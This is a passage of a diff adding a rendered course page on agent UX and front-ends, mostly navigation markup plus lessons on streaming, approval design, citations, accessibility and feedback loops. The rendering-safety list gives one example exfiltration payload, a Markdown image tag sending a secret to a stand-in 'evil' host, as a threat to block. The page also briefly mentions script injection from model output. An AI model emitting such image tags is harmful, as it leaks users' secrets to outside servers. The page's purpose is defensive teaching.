+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-2-ag-ui-copilot-with-shared-plan-state-and-risk-tiered-approvals-35h-node" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 2 — AG-UI copilot with shared plan state and risk-tiered approvals (≈3.5h) [Node]
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-3-an-mcp-app-maintenance-booking-form-travelling-with-the-tool-2h" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 3 — An MCP App: maintenance booking form travelling with the tool (≈2h)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-4-citations-uncertainty-and-the-feedback-to-evals-loop-plus-an-accessibility-audit-2h" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 4 — Citations, uncertainty and the feedback-to-evals loop, plus an accessibility audit (≈2h)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kata
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#product-increment-fleet-ops-copilot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Product increment — Fleet Ops Copilot
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#factory-increment-your-agentic-sdlc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Factory increment — your agentic SDLC
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Assessment
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-pitfalls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common pitfalls
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../d05-performance-and-cost-engineering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D5 — Инженеринг на производителността и разходите
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../d06-building-your-own-agent-tooling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D6 — Изграждане на собствени инструменти за агенти
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../d07-agent-reliability-engineering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D7 — Инженеринг на надеждността на агенти
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Част 5 — Експертна специализация: AI Solution Architect
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Част 5 — Експертна специализация: AI Solution Architect
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-5-architect-track/a01-ai-strategy-use-case-discovery-and-business-case/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A1 — AI стратегия, откриване на сценарии на употреба и бизнес обосновка
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-5-architect-track/a02-azure-ai-reference-architectures-and-well-architected-for-ai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A2 — Референтни AI архитектури в Azure и Well-Architected за AI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-5-architect-track/a03-enterprise-knowledge-and-data-architecture-for-ai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A3 — Корпоративна архитектура на знанията и данните за AI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-5-architect-track/a04-agent-platform-and-integration-architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A4 — Платформа за агенти и интеграционна архитектура
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-5-architect-track/a05-reliability-scale-model-lifecycle-and-finops/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A5 — Надеждност, мащаб, жизнен цикъл на моделите и FinOps
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-5-architect-track/a06-ai-governance-risk-and-compliance-architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A6 — Архитектура за управление на AI, риска и съответствието
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-5-architect-track/a07-the-architect-s-craft-in-ai-programmes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A7 — Занаятът на архитекта в AI програми
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Част 6 — Съвместен финален проект
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Част 6 — Съвместен финален проект
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capstone/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Финален проект
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Приложение
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Приложение
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../appendix/glossary/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Речник на термините
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../appendix/references/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Допълнителна литература
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Съдържание">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Съдържание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#why-this-matters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why this matters
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#learning-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Learning outcomes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concepts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Concepts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-streaming-perceived-latency-structure-and-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Streaming: perceived latency, structure and control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-agentui-integration-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Agent–UI integration options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-approval-ux-that-resists-rubber-stamping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Approval UX that resists rubber-stamping
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-citations-users-can-verify" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Citations users can verify
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-uncertainty-partial-results-and-errors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Uncertainty, partial results and errors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-accessibility-for-streaming-and-agentic-uis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Accessibility for streaming and agentic UIs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-feedback-that-becomes-evals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Feedback that becomes evals
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-front-end-stack-choices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Front-end stack choices
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-versions-as-of-oct-2026" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools &amp; versions (as of Oct 2026)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Labs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Labs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lab-1-streaming-dispatcher-console-in-blazor-3h" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 1 — Streaming dispatcher console in Blazor (≈3h)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-2-ag-ui-copilot-with-shared-plan-state-and-risk-tiered-approvals-35h-node" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 2 — AG-UI copilot with shared plan state and risk-tiered approvals (≈3.5h) [Node]
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-3-an-mcp-app-maintenance-booking-form-travelling-with-the-tool-2h" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 3 — An MCP App: maintenance booking form travelling with the tool (≈2h)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-4-citations-uncertainty-and-the-feedback-to-evals-loop-plus-an-accessibility-audit-2h" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 4 — Citations, uncertainty and the feedback-to-evals loop, plus an accessibility audit (≈2h)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kata
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#product-increment-fleet-ops-copilot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Product increment — Fleet Ops Copilot
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#factory-increment-your-agentic-sdlc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Factory increment — your agentic SDLC
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Assessment
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-pitfalls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common pitfalls
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="d4-agent-ux-front-ends">D4 — Agent UX &amp; front-ends<a class="headerlink" href="#d4-agent-ux-front-ends" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>Level:</strong> Expert (AI Solution Developer track) · <strong>Duration:</strong> 14h (theory 25% / labs 75%) · <strong>Prerequisites:</strong> Core C0–C19 and Gate G3; especially C7 (citations, security trimming), C9/C12 (MAF agents, HITL), C14 (judges, error analysis), C15 (feedback events), C16 (output handling, BOLA) · <strong>Volatility:</strong> High (AG-UI in MAF is preview; MCP Apps is a new official extension; host support varies)</p>
+</blockquote>
+<h2 id="why-this-matters">Why this matters<a class="headerlink" href="#why-this-matters" title="Permanent link">&para;</a></h2>
+<p>A proficient practitioner streams tokens into a chat box. An expert designs the <strong>contract between the agent and the human</strong>: what the agent is doing, what it intends to do, what it did, and on what evidence. They make agency legible without drowning the user. They make approvals resistant to rubber-stamping and to manipulation by the agent's own phrasing. They communicate uncertainty with signals that are actually calibrated, and keep the UI usable with a screen reader while text streams in. And they close the loop: every thumbs-down, edit and abandoned session becomes input to error analysis and evals.</p>
+<p>Trakia's dispatchers work in a busy control room with three screens. The fleet manager approves maintenance plans from a phone between meetings. Customer-service agents paste Fleet Ops answers into emails to customers. The failure modes in this setting are UX failures with operational consequences:
+- <strong>automation bias:</strong> a dispatcher approves a 12-action plan in two seconds because the summary sounded confident;
+- <strong>citation theatre:</strong> a customer gets a "policy says…" answer whose footnote points to a superseded handbook version;
+- <strong>lost work:</strong> the stream died at 80% and the agent's draft vanished;
+- <strong>injection:</strong> the model emitted a <code>&lt;script&gt;</code> that ran in the console.</p>
+<p>OWASP's agentic guidance calls for "human confirmation showing the raw action rather than the agent's summary" (against ASI09 Human-Agent Trust Exploitation). The EU AI Act requires disclosure of AI interaction (Art. 50). For high-risk systems it requires human oversight designed against automation bias (Art. 14), and that design obligation lives in the UI.</p>
+<h2 id="learning-outcomes">Learning outcomes<a class="headerlink" href="#learning-outcomes" title="Permanent link">&para;</a></h2>
+<ol>
+<li><strong>Implement</strong> end-to-end streaming (model → MAF → ASP.NET Core → Blazor/React) with cancellation that stops billing, resumable streams, and safe rendering of partial Markdown.</li>
+<li><strong>Choose and justify</strong> an agent–UI integration: plain SSE, AG-UI events, MCP Apps (<code>ui://</code>), or a typed generative-UI component registry. Base the choice on interactivity, host and security.</li>
+<li><strong>Design and build</strong> HITL approval UX that shows raw actions, diffs, reversibility and cost, scales friction with risk, re-validates on the server, and measures rubber-stamping.</li>
+<li><strong>Render</strong> verifiable citations (passage-level, versioned, permission-trimmed) and <strong>evaluate</strong> citation accuracy.</li>
+<li><strong>Communicate</strong> uncertainty, partial results and errors with calibrated signals and standard phrasing, without leaking guardrail internals.</li>
+<li><strong>Meet</strong> WCAG 2.2 AA for streaming and approval flows (live regions, focus, keyboard, reduced motion, language tags) and <strong>verify</strong> it automatically.</li>
+<li><strong>Capture</strong> explicit and implicit feedback joined to traces, and <strong>convert</strong> it into error-analysis queues, eval cases and preference pairs.</li>
+</ol>
+<h2 id="concepts">Concepts<a class="headerlink" href="#concepts" title="Permanent link">&para;</a></h2>
+<h3 id="1-streaming-perceived-latency-structure-and-control">1. Streaming: perceived latency, structure and control<a class="headerlink" href="#1-streaming-perceived-latency-structure-and-control" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>What users perceive.</strong> They feel time-to-first-<em>meaningful</em>-content, not TTFT. A streamed "Let me check…" followed by 4 seconds of silence is worse than an honest activity indicator. Stream <strong>activity</strong> (tool started, retrieving 3 documents) as well as text.</li>
+<li><strong>Streaming structure.</strong> With structured outputs, stream partial JSON into a progressively rendered component (a plan table filling row by row) rather than showing raw JSON. MEAI <code>GetStreamingResponseAsync</code> and MAF <code>RunStreamingAsync</code> yield updates (<code>AgentResponseUpdate</code>) carrying text deltas, function-call content and usage. Map them to UI events.</li>
+<li><strong>Cancellation must reach the model.</strong> Propagate the browser's abort → <code>HttpContext.RequestAborted</code> → <code>CancellationToken</code> into <code>RunStreamingAsync</code>, so the upstream call stops and stops billing. A "Stop" button that only hides the stream wastes tokens.</li>
+<li><strong>Resumability.</strong> Mobile connections drop. Persist the stream (response ID + accumulated events) so a reconnect replays from the last event ID. The MAF Durable extension (prerelease) advertises reliable streaming via Redis. Otherwise, implement an event log keyed by run ID.</li>
+<li><strong>Transport.</strong> For one-way streams use SSE (simple, proxy-friendly, <code>Last-Event-ID</code>). For Blazor Server/Interactive use SignalR (already in the circuit). Use WebSockets when the client must send mid-stream signals (barge-in, approvals) on the same channel.</li>
+<li><strong>Rendering safety (LLM05 Improper Output Handling):</strong></li>
+<li>Model output is untrusted. Render Markdown with an allow-list sanitizer and never render HTML from the model.</li>
+<li>Links: show the full domain and add <code>rel="noopener noreferrer"</code>. Block <code>javascript:</code> and data URIs.</li>
+<li>Partial Markdown: unclosed code fences or tables during streaming need a tolerant renderer that re-renders the tail. Rendering each chunk independently corrupts output.</li>
+<li><strong>Markdown image tags are an exfiltration channel</strong> (<code>![x](https://evil/?q=secret)</code>). Allow images only from your own CDN.</li>
+</ul>
+<h3 id="2-agentui-integration-options">2. Agent–UI integration options<a class="headerlink" href="#2-agentui-integration-options" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>What it is</th>
+<th>Use when</th>
+<th>Risks</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Plain SSE of text + activity events</td>
+<td>Your own event schema</td>
+<td>Simple chat + activity timeline</td>
+<td>You reinvent state sync and approvals</td>
+</tr>
+<tr>
+<td><strong>AG-UI</strong></td>
+<td>Event-based protocol for streaming agent runs (text, tool calls, state, HITL) to front-ends; originated with CopilotKit</td>
+<td>Rich copilots with shared state between agent and UI</td>
+<td><strong>MAF support is preview</strong> (CopilotKit and ChatKit adapters); event names and versions should be pinned and verified</td>
+</tr>
+<tr>
+<td><strong>MCP Apps</strong></td>
+<td>Official MCP extension: a server declares interactive UI as a <code>ui://</code> resource, rendered by the host in a <strong>sandboxed iframe</strong>, communicating via JSON-RPC over <code>postMessage</code>, with text/structured fallback</td>
+<td>The tool's UI should travel <em>with the tool</em> into any MCP Apps-capable host (IDE agents, chat clients, your app). The Azure Functions MCP extension supports MCP Apps</td>
+<td>Host support varies; iframe sandbox and CSP must be strict; the UI is still untrusted from the host's view</td>
+</tr>
+<tr>
+<td>Typed generative UI (component registry)</td>
+<td>The model selects from <em>your</em> components and fills typed props (<code>ShowPlanTable(PlanDto)</code>, <code>ShowApproval(ApprovalDto)</code>) via tool calls or structured output</td>
+<td>Dynamic but safe UIs</td>
+<td>Keep the registry small and schema-validated</td>
+</tr>
+<tr>
+<td>Model-generated HTML/JS</td>
+<td>The model writes the UI</td>
+<td>Prototyping only</td>
+<td>XSS, injection, unreviewable behaviour: <strong>don't ship</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decision rule.</strong> Default to a <strong>typed component registry</strong> over SSE or AG-UI for your own app. Use <strong>MCP Apps</strong> when the interactive surface belongs to a tool that other hosts (including coding agents) must render. Never render model-authored markup.</p>
+<h3 id="3-approval-ux-that-resists-rubber-stamping">3. Approval UX that resists rubber-stamping<a class="headerlink" href="#3-approval-ux-that-resists-rubber-stamping" title="Permanent link">&para;</a></h3>
+<p>MAF surfaces approvals as typed requests: <code>ToolApprovalRequestContent</code> inside orchestrations and <code>RequestPort</code> in workflows. MEAI has <code>UserInputRequestContent</code> for function approval. The UI's job is to make the decision <strong>informed and proportional</strong>.</p>
+<p>Anatomy of an approval card, generated from typed data and never from the agent's prose:
+1. <strong>Action, verbatim:</strong> tool name and arguments, rendered human-readably (vehicle TRK-0142 / РВ 0142 КМ, slot Tue 21 Oct 08:00–12:00, Plovdiv bay 3).
+2. <strong>Effect and diff:</strong> before → after (truck reassignment, route impact).
+3. <strong>Reversibility and blast radius:</strong> "can be released until Mon 18:00" or "<strong>irreversible</strong>: sends SMS to 14 drivers".
+4. <strong>Cost:</strong> € amount and budget remaining.
+5. <strong>Evidence:</strong> links to the telematics trend and policy passage the agent used.
+6. <strong>The agent's rationale</strong>, visually secondary and labelled as the AI's explanation.</p>
+<p><strong>Friction proportional to risk.</strong>
+- Reversible, low-cost actions can be batch-approved.
+- Irreversible or high-value actions need per-item confirmation, and the highest tier needs typed confirmation (re-type the vehicle ID) or four-eyes approval.</p>
+<p>Batch approval of mixed-risk items is an anti-pattern.</p>
+<p><strong>Server-side truth.</strong>
+- The approval payload from the client is a <em>claim</em>. The server re-loads the pending request by ID.
+- The server checks that the approver is authorized for that resource. This is BOLA prevention, because Agent Service does not enforce per-user conversation authorization.
+- The server checks that the request has not expired or changed since it was displayed (version or ETag), and executes exactly what was shown.</p>
+<p><strong>Measure automation bias:</strong>
+- approval rate;
+- median time-to-decision per risk tier;
+- the "approve within 2 s" share;
+- the rate at which approved actions are later reverted.</p>
+<p>An approval rate near 100% with sub-2-second decisions on high-risk cards is an incident precursor, not a success metric. Inject <strong>canary approvals</strong> (seeded, clearly wrong actions in a training environment) to measure vigilance. Do not inject them into production.</p>
+<h3 id="4-citations-users-can-verify">4. Citations users can verify<a class="headerlink" href="#4-citations-users-can-verify" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Cite <strong>passages</strong>, not documents. Clicking a citation opens the source at the highlighted chunk, showing the doc title, <strong>version and effective date</strong>, and the language (BG/EN).</li>
+<li><strong>Permission-trimmed</strong> citations: never render a snippet the user cannot open. Security trimming happens at query time (C7). The UI must not show titles of documents the user lacks access to.</li>
+<li><strong>Abstention is a first-class state:</strong> "No policy found that covers this; ask HR" with a link to the search the agent ran. It must not be a disguised guess.</li>
+<li>Evaluate <strong>citation accuracy</strong>: does the cited passage support the sentence? Use a binary judge per claim, calibrated (C14). Also check <strong>staleness</strong>: is the citation from a superseded version?</li>
+</ul>
+<h3 id="5-uncertainty-partial-results-and-errors">5. Uncertainty, partial results and errors<a class="headerlink" href="#5-uncertainty-partial-results-and-errors" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Do not display raw model "confidence %".</strong> Self-reported numbers are poorly calibrated. Use signals you can validate:</li>
+<li>retrieval coverage (were sources found? how many agree?);</li>
+<li>calibrated judge or classifier scores (D1, D5);</li>
+<li>agreement across samples for high-stakes answers.</li>
+</ul>
+<p>Map them to <strong>three or four verbal levels</strong> with fixed wording ("Based on 2 matching policy sections", "I couldn't confirm this — please check with…").
+- <strong>Partial results:</strong> "3 of 4 depots checked; Varna timed out" with a retry control. A silent omission is worse than an explicit gap.
+- <strong>Guardrail blocks:</strong> explain what the user can do without revealing detection internals. "I can't help with that request here" plus the support route, and log the block for review.
+- <strong>Rate limits and budget stops:</strong> say what happened and when to retry. Never show a raw stack trace or a provider error.
+- <strong>Disclosure:</strong> state clearly that the user is interacting with an AI (Art. 50). Label AI-drafted text that users will forward to customers ("Drafted by Fleet Ops Copilot — review before sending").</p>
+<h3 id="6-accessibility-for-streaming-and-agentic-uis">6. Accessibility for streaming and agentic UIs<a class="headerlink" href="#6-accessibility-for-streaming-and-agentic-uis" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Live regions.</strong> Streamed text in an <code>aria-live="polite"</code> region floods screen readers token by token. Announce at <strong>sentence or message completion</strong>: buffer the live region and update the visual region continuously. Announce activity changes ("Searching maintenance manuals") once.</li>
+<li><strong>Focus management.</strong> An approval dialog takes focus, traps it, labels the action, and returns focus on close. "Approve" must not be the default Enter action for irreversible tiers.</li>
+<li><strong>Keyboard:</strong> every control is reachable without a mouse. Stop is a keyboard shortcut announced in the UI.</li>
+<li><strong>Reduced motion:</strong> honour <code>prefers-reduced-motion</code> and disable typewriter animations and pulsing indicators.</li>
+<li><strong>Language:</strong> set <code>lang="bg"</code> or <code>lang="en"</code> per message so screen readers use the right voice. Mixed-language citations get their own <code>lang</code>.</li>
+<li><strong>Contrast and target sizes:</strong> WCAG 2.2 AA, including on the fleet manager's phone.</li>
+<li>Verify with <strong>axe-core</strong> in Playwright tests, plus a manual screen-reader pass (NVDA/VoiceOver) on the approval flow.</li>
+</ul>
+<h3 id="7-feedback-that-becomes-evals">7. Feedback that becomes evals<a class="headerlink" href="#7-feedback-that-becomes-evals" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Capture</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Thumbs up/down + reason code (wrong, outdated, incomplete, unsafe, slow)</td>
+<td>Event with <code>gen_ai.conversation.id</code>, response ID, prompt/model version</td>
+<td>Error-analysis queue (C14); per-version dashboards (C15)</td>
+</tr>
+<tr>
+<td>Free-text comment</td>
+<td>Same event; PII-scrubbed</td>
+<td>Open coding</td>
+</tr>
+<tr>
+<td>Edit of an AI draft before sending</td>
+<td>Diff size and kind</td>
+<td>Strong implicit signal; edited pairs → DPO candidates (D1)</td>
+</tr>
+<tr>
+<td>Retry / regenerate, copy, abandonment</td>
+<td>Implicit events</td>
+<td>Weak signals for sampling</td>
+</tr>
+<tr>
+<td>Approval rejected + reason</td>
+<td>Workflow event</td>
+<td>Planner failure taxonomy (D2)</td>
+</tr>
+</tbody>
+</table>
+<p>Pipeline:
+1. Events go to App Insights, joined to traces.
+2. A weekly sample is drawn: all thumbs-down, plus a random 10% of the rest, plus outliers.
+3. The sample goes through annotation, then a failure taxonomy, then new golden cases or judges.</p>
+<p>Feedback is <strong>not</strong> a quality metric by itself, because the people who click are a skewed sample. It is a <strong>sampling signal</strong> for error analysis. Comments are personal data, so apply the retention rules.</p>
+<h3 id="8-front-end-stack-choices">8. Front-end stack choices<a class="headerlink" href="#8-front-end-stack-choices" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Blazor (.NET 10, Interactive Server/Auto)</strong> fits internal tools (dispatcher console, back-office review queue). Streaming rides on SignalR, and C# end to end keeps the DTOs shared.</li>
+<li><strong>React + CopilotKit [Node]</strong> fits the AG-UI path and the richest copilot interactions. It is also the most common ecosystem for AG-UI samples.</li>
+<li><strong>Teams</strong> suits fleet managers, via Foundry agent publishing (announced Build 2026; verify current status). Approval cards there must follow the same anatomy (§3).</li>
+<li><strong>MCP Apps</strong> are for tool UIs that must also appear inside coding agents and other MCP hosts.</li>
+</ul>
+<p><strong>Misconceptions to unlearn:</strong>
+- "Streaming fixes latency." It fixes <em>perceived</em> latency only if something meaningful arrives early.
